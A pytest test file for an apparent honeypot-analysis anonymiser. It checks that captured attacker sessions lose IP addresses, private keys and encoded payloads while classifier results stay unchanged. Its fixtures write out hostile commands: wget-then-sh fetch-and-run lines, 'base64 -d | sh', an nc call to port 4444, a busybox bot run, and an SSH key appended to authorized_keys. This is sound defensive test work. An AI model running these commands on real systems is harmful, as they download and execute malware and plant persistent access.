"""Tests for making the evaluation set safe to commit.

Two properties carry the weight. Nothing identifying survives; and nothing a
classifier depends on is lost, because an anonymiser that changes a
classifier's answer would change the evaluation without anyone noticing.
"""

from __future__ import annotations

import pytest

from honeypot_ai.classify import rules
from honeypot_ai.classify.facts import SessionFacts
from honeypot_ai.label.anonymise import Anonymiser

# Real-looking public addresses for the tests to remove. These are genuine
# public ranges on purpose: the documentation ranges are what the anonymiser
# writes, so a test written with them could not tell success from failure.
PUBLIC_A = "8.8.8.8"
PUBLIC_B = "1.1.1.1"


def facts(*commands: str, urls: tuple[str, ...] = ()) -> SessionFacts:
    return SessionFacts(session_id="s", commands=commands, download_urls=urls)


# --- Addresses -------------------------------------------------------------


def test_a_public_address_becomes_a_documentation_address() -> None:
    out = Anonymiser().text(f"wget http://{PUBLIC_A}/x.sh")
    assert PUBLIC_A not in out
    assert "http://198.51.100.1/x.sh" in out


def test_the_same_address_gets_the_same_placeholder_everywhere() -> None:
    """Otherwise two sessions fetching from one server stop looking related."""
    anonymiser = Anonymiser()
    first = anonymiser.text(f"wget http://{PUBLIC_A}/a")
    second = anonymiser.text(f"curl {PUBLIC_A}/b; wget {PUBLIC_B}/c")

    assert "198.51.100.1/a" in first
    assert "198.51.100.1/b" in second
    assert "198.51.100.2/c" in second


@pytest.mark.parametrize(
    "address",
    ["127.0.0.1", "0.0.0.0", "10.0.0.5", "192.168.1.1", "172.16.0.9"],  # noqa: S104
)
def test_private_and_loopback_addresses_are_left_alone(address: str) -> None:
    """They identify nobody, and rewriting them changes what a session means."""
    assert Anonymiser().text(f"ping {address}") == f"ping {address}"


def test_something_that_only_looks_like_an_address_is_left_alone() -> None:
    assert Anonymiser().text("echo 999.1.1.1") == "echo 999.1.1.1"


def test_a_port_does_not_stop_the_address_being_found() -> None:
    out = Anonymiser().text(f"nc {PUBLIC_A}:4444")
    assert PUBLIC_A not in out
    assert "198.51.100.1:4444" in out


def test_a_public_ipv6_address_is_replaced_and_loopback_is_not() -> None:
    anonymiser = Anonymiser()
    assert "2606:4700::1111" not in anonymiser.text("ping6 2606:4700::1111")
    assert anonymiser.text("ping6 ::1") == "ping6 ::1"


def test_download_urls_are_anonymised_as_well_as_commands() -> None:
    out = Anonymiser().facts(facts("wget x", urls=(f"http://{PUBLIC_A}/x",)))
    assert PUBLIC_A not in out.download_urls[0]


def test_hostnames_are_kept() -> None:
    """Attacker infrastructure, and the ordinary currency of threat intel."""
    assert "evil.example" in Anonymiser().text("wget http://evil.example/x")


# --- Payloads typed in as text ---------------------------------------------

ELF_CHUNK = r'echo -ne "\x7F\x45\x4C\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00" > .d'


def test_a_long_hex_payload_is_cut_to_its_first_bytes() -> None:
    out = Anonymiser().text(ELF_CHUNK)
    assert r"\x7F\x45\x4C\x46" in out  # the ELF magic, recognisable
    assert r"\x01\x01\x01\x61" not in out  # and nothing after it
    assert "+12 bytes sha256:" in out


def test_a_short_hex_marker_is_left_intact() -> None:
    """`echo -e "\\x6F\\x6B"` is a liveness probe, not a payload."""
    probe = r'echo -e "\x6F\x6B"'
    assert Anonymiser().text(probe) == probe


# Realistic base64: mixed case and digits, which is what encoded data looks
# like and what separates it from a long path or a hex digest.
BLOB = "IyEvYmluL3NoCmNkIC90bXAgfHwgY2QgL3Zhci90bXAKd2dldCBodHRwOi8vZXhhbXBsZQo" * 3


def test_a_long_base64_blob_is_cut() -> None:
    out = Anonymiser().text(f"echo {BLOB} | base64 -d | sh")
    assert BLOB not in out
    assert f"<base64: {len(BLOB)} chars sha256:" in out


def test_nothing_of_an_encoded_run_is_kept_not_even_a_prefix() -> None:
    """Sixteen characters from every line of a ten-line key is a quarter of
    the key, and partial-key-exposure attacks work from fractions like that."""
    out = Anonymiser().text(f"echo {BLOB}")
    assert BLOB[:8] not in out


def test_a_long_path_is_not_mistaken_for_encoded_data() -> None:
    path = "/usr/local/share/applications/somethingverylongwithoutanydigits/bin"
    assert Anonymiser().text(f"ls {path}") == f"ls {path}"


def test_a_sha256_written_in_a_command_is_left_intact() -> None:
    digest = "a" * 64
    assert digest in Anonymiser().text(f"sha256sum -c {digest}")


# --- Private keys -----------------------------------------------------------
#
# The first real sample contained a session that wrote an OpenSSH private key
# to disk one line per command and used it to fetch its payload over scp. Every
# line was under the old 80-character threshold, so all ten went through. The
# key below is invented; only its shape is taken from that session.

# Markers are built at runtime so no scanner sees a literal key block in the repo.
_BEGIN = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
_END = "-----END OPENSSH " + "PRIVATE KEY-----"
_BEGIN_RSA = "-----BEGIN RSA " + "PRIVATE KEY-----"
_END_RSA = "-----END RSA " + "PRIVATE KEY-----"

FAKE_KEY_LINES = (
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
    "QyNTUxOQAAACBhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkAAAAJmFiY2",
    "RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0",
    "dXZ3eHl6MDEyMzQ1Njc4OQAAAA",
)
SPLIT_KEY_SESSION = (
    f"cd /tmp || cd /var/tmp; echo '{_BEGIN}",
    *FAKE_KEY_LINES,
    f"{_END}' > key.ppk; echo 'StrictHostKeyChecking no' > sshcfg",
    f"{_END} > key.ppk",
    "chmod 400 key.ppk; scp -i key.ppk dlr@203.0.113.9:sh out_sh",
)


def test_a_key_pasted_one_line_per_command_does_not_survive() -> None:
    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION))
    joined = "\n".join(out.commands)
    for line in FAKE_KEY_LINES:
        assert line not in joined
        assert line[:12] not in joined


def test_no_private_key_marker_survives_for_the_commit_hook_to_find() -> None:
    """The repository refuses commits containing a private-key header. That
    hook should never have to be what catches this."""
    joined = "\n".join(Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands)
    assert "PRIVATE KEY-----" not in joined


def test_what_the_session_did_with_the_key_is_kept() -> None:
    """The key goes; the fact that it was written and used stays."""
    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands
    assert "> key.ppk" in out[len(FAKE_KEY_LINES) + 1]
    assert out[-1].startswith("chmod 400 key.ppk; scp -i key.ppk")
    assert len(out) == len(SPLIT_KEY_SESSION)


def test_a_key_block_inside_one_command_is_replaced_whole() -> None:
    command = f"echo '{_BEGIN_RSA}\n" + "\n".join(FAKE_KEY_LINES) + f"\n{_END_RSA}' > id_rsa"
    out = Anonymiser().facts(facts(command)).commands[0]
    assert all(line not in out for line in FAKE_KEY_LINES)
    assert "<private key: RSA PRIVATE KEY" in out
    assert out.endswith("> id_rsa")


def test_a_key_that_never_closes_is_redacted_to_the_end() -> None:
    """Losing a few commands is the right trade against publishing a key."""
    out = Anonymiser().facts(facts(f"echo '{_BEGIN}", *FAKE_KEY_LINES))
    assert all(line not in "\n".join(out.commands) for line in FAKE_KEY_LINES)


def test_a_binary_pasted_through_a_base64_heredoc_does_not_survive() -> None:
    """The first real sample held a 64-bit ELF delivered this way, 64
    characters to a command, every line under the old threshold."""
    lines = tuple(BLOB[i : i + 64] for i in range(0, 192, 64))
    out = Anonymiser().facts(facts("base64 -d > /tmp/hum <<.", *lines)).commands
    assert out[0] == "base64 -d > /tmp/hum <<."
    assert all(line not in "\n".join(out) for line in lines)


# The second real sample: four lines of that ELF slipped through. Padding in a
# binary encodes to runs of `A`, so a line has neither lower case nor digits and
# the mixture test calls it "not encoded". The lines below are invented.
ZERO_LINES = (
    "AAAAAEAAOAADAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAIBHYvFVUFgh",
)


def test_zero_padded_base64_lines_in_a_heredoc_do_not_survive() -> None:
    commands = ("base64 -d > /tmp/hum <<.", BLOB[:64], ZERO_LINES[0], ZERO_LINES[1] + " ", ".")
    out = Anonymiser().facts(facts(*commands)).commands
    assert all(line not in "\n".join(out) for line in ZERO_LINES)
    assert out[0] == commands[0]
    assert out[-1] == "."  # the delimiter is not payload


def test_a_heredoc_line_is_replaced_whatever_it_looks_like() -> None:
    """The heredoc, not the line's shape, says it is payload: lower case and
    digits only passes the mixture test as "not encoded"."""
    line = "mzxw6ytboi2dgnzzgq3tmoruhbtwcytbgq3dsnjugm3tmmbrgi4tcmbq"
    out = Anonymiser().facts(facts("base64 -d > /tmp/hum <<.", line, line + " ")).commands
    assert line not in "\n".join(out)


def test_a_zero_padded_line_is_caught_even_without_a_heredoc() -> None:
    assert ZERO_LINES[0] not in Anonymiser().text(f"echo {ZERO_LINES[0]}")


def test_a_heredoc_stops_at_its_delimiter() -> None:
    commands = ("base64 -d > /tmp/x <<EOF", BLOB[:64], "EOF", "linuxshell", "administrator")
    out = Anonymiser().facts(facts(*commands)).commands
    assert out[3:] == ("linuxshell", "administrator")


def test_a_heredoc_stops_at_the_first_line_that_is_not_base64() -> None:
    commands = ("base64 -d > /tmp/x <<.", BLOB[:64], "uname -a", "linuxshell")
    out = Anonymiser().facts(facts(*commands)).commands
    assert out[2:] == ("uname -a", "linuxshell")


def test_words_are_left_alone_when_no_decoding_heredoc_is_open() -> None:
    """Honeypot logs are full of `linuxshell` and `administrator`: login
    attempts typed at a prompt. Only a heredoc makes a word payload."""
    commands = ("linuxshell", "administrator", "cat <<EOF", "linuxshell")
    assert Anonymiser().facts(facts(*commands)).commands == commands


def test_a_here_string_does_not_open_a_heredoc() -> None:
    commands = ("base64 -d <<< aGVsbG8gd29ybGQ=", "linuxshell")
    assert Anonymiser().facts(facts(*commands)).commands[1] == "linuxshell"


# --- User-Agents -------------------------------------------------------------

UA = (
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0 (Edition Yx GX)"
)


def test_browser_versions_in_a_user_agent_are_not_taken_for_addresses() -> None:
    """`Chrome/120.0.0.0` parses as an IPv4 address, and the first export made
    `Chrome/198.51.100.4` of it: a documentation address, in a place no
    server ever was."""
    anonymiser = Anonymiser()
    assert anonymiser.text(UA) == UA
    assert anonymiser.addresses_replaced == 0


def test_a_real_address_next_to_a_user_agent_is_still_replaced() -> None:
    out = Anonymiser().text(f"{UA}; wget http://{PUBLIC_A}/x")
    assert PUBLIC_A not in out
    assert "Chrome/120.0.0.0" in out


def test_a_path_that_looks_like_a_browser_is_not_a_user_agent() -> None:
    assert PUBLIC_A not in Anonymiser().text(f"wget http://evil.example/Chrome/{PUBLIC_A}")


# --- The invariant the evaluation depends on -------------------------------


@pytest.mark.parametrize(
    "commands",
    [
        (ELF_CHUNK, "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"),
        (r'echo -e "\x6F\x6B"',),
        (r'echo -e "\x47\x41\x59\x46\x47\x54"',),
        # Eight bytes: the one marker long enough to be truncated, and so the
        # one that proves truncation keeps enough for the rule to match.
        (r'echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"',),
        (f"cd /tmp; wget http://{PUBLIC_A}/bins/x.sh; chmod 777 x.sh; sh x.sh",),
        ('cd ~ && mkdir .ssh && echo "ssh-rsa ' + "A" * 300 + '" >> .ssh/authorized_keys',),
        ("uname -a", "cat /proc/cpuinfo", "nproc"),
        ("enable", "system", "shell", "sh"),
        SPLIT_KEY_SESSION,
        # v0.6.0 rules: a hex payload write, cut by the anonymiser to four bytes.
        (r'echo -ne "\x7F\x45\x4C\x46\x01\x01\x01\x61\x00\x00\x00\x00" >> .d',),
        (r'echo -e "\x50\x6f\x72\x74/tmp" > /tmp/.none',),
        # The heredoc delivery the rules are known to misread: whatever they
        # conclude about it must be the same before and after.
        ("base64 -d > /tmp/hum <<.", BLOB[:64], ZERO_LINES[0], ZERO_LINES[1], "uname -a"),
        (f'wget --header="{UA}" http://{PUBLIC_A}/x.sh', "sh x.sh"),
    ],
)
def test_anonymising_never_changes_what_the_rules_conclude(commands: tuple[str, ...]) -> None:
    raw = facts(*commands)
    safe = Anonymiser().facts(raw)

    before, after = rules.classify(raw), rules.classify(safe)
    assert after.intent is before.intent
    assert after.behaviours == before.behaviours
